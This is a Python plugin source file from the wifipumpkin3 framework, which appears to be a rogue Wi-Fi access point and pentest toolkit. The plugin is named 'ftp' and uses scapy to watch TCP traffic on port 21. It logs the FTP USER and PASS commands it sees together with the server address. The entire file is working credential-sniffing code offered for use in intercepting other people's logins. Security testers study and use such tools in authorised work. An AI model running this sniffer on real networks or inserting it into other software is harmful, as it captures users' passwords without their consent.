from scapy.all import *
from wifipumpkin3.plugins.sniffkin3.default import PSniffer

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2020 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class ftp(PSniffer):
    """ this script capture credentials of service ftp request HTTP """

    _activated = False
    _instance = None

    meta = {
        "Name": "ftp",
        "Version": "1.0",
        "Description": "capture credentials of service ftp request HTTP",
        "Author": "Pumpkin-Dev",
    }

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value

    @staticmethod
    def getInstance():
        if ftp._instance is None:
            ftp._instance = ftp()
        return ftp._instance

    def filterPackets(self, pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
            self.dport = pkt[TCP].dport
            self.sport = pkt[TCP].sport
            self.src_ip = str(pkt[IP].src)
            self.dst_ip = str(pkt[IP].dst)
            self.load = pkt[Raw].load
            if self.dport == 21 or self.sport == 21:
                self.parse_ftp(self.load, self.dst_ip, self.src_ip)

    def parse_ftp(self, load, ip_dst, ip_src):
        load = repr(load)[1:-1].replace(r"\r\n", "")
        if "USER " in load:
            self.logging.info("[!] FTP User: {} SERVER: {}".format(load, ip_dst))
        if "PASS " in load:
            self.logging.info("[!] FTP Pass: {} {}".format(load, ip_dst))
        if "authentication failed" in load:
            self.logging.info("[*] FTP authentication failed")
            self.logging.info(load)
